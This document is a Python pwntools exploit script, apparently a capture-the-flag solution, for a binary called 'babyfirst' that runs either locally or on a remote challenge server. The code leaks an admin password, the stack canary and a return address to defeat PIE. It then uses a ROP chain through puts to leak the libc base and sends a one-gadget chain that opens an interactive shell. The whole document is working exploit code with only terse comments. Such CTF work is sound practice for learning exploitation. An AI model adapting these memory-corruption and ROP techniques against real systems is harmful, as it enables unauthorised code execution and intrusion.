#!/usr/bin/python
from pwn import *
import os
from time import sleep
import re
e = ELF("./babyfirst")
libc = ELF("./libc-2.27.so")
if 'remote' in os.environ:
    io = remote("babyfirst.chung96vn.cf", 31337)
else:
    io = process(e.path,env={"LD_PRELOAD":libc.path})

#LEAK PASSWORD

io.sendline('1')
sleep(0.2)
io.send('A'*32)
sleep(0.2)
io.sendline('2')
sleep(0.2)
d = io.recv()
log.info(d)
pattern = re.compile(r'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(.{20})',re.DOTALL)
password = pattern.search(d).group(1)
log.info("Password {}".format(password))
log.info("Login to admin")
io.sendline('1')
sleep(0.2)
io.send('admin')
sleep(0.2)
io.send(password[:16])
sleep(0.2)
log.info(io.recv())
#PLAY
#Leak Stack canary (maybe PIE slide? nope. 1 by 1)
io.sendline('2')
sleep(0.2)
log.info(io.recv())
io.send('A'*41)
sleep(0.2)
pattern = re.compile(r'A{41}(.{7})',re.DOTALL)
d = io.recv()
log.info(d)
m = pattern.match(d)
canary = u64('\x00'+m.group(1))
log.info("Canary:"+hex(canary))
#Leak retaddr for PIE slide
io.send('A'*56)
sleep(0.2)
pattern = re.compile(r'A{56}(.{6,8})(?=\n)',re.DOTALL)
d = io.recv()
log.info(repr(d))
m = pattern.match(d)
log.info(repr(m.group(1)))
retaddr = u64(m.group(1).ljust(8,"\x00"))
log.info("retaddr:"+hex(retaddr))
ebase = retaddr-3981
ropchain = ''
ropchain +=p64(ebase+0x1023) #pop rdi
ropchain +=p64(ebase+e.got['puts']) #rsi: GOT address of puts
ropchain +=p64(ebase+e.plt['puts']) #return to printf@PLT
ropchain +=p64(ebase+e.symbols['Play']) #Play it again
io.send("END"+cyclic(40-3)+p64(canary)+p64(0)+ropchain)
sleep(0.2)
d = io.recv()
pattern = re.compile(r'.{62}(.{6}).',re.DOTALL)
putsaddr = u64(pattern.match(d).group(1).ljust(8,'\x00'))
log.info("puts addr:"+hex(putsaddr))
libcbase = putsaddr - libc.symbols['puts']
binsh = libcbase + next(libc.search('/bin/sh'))
log.info(hex(binsh))
ropchain = ''
ropchain += p64(libcbase+0x3eb0b)
ropchain += p64(0)
ropchain += p64(libcbase+0x4f2c5)
raw_input("Get Shell?")
io.send("END"+cyclic(40-3)+p64(canary)+p64(0)+ropchain)
io.interactive()
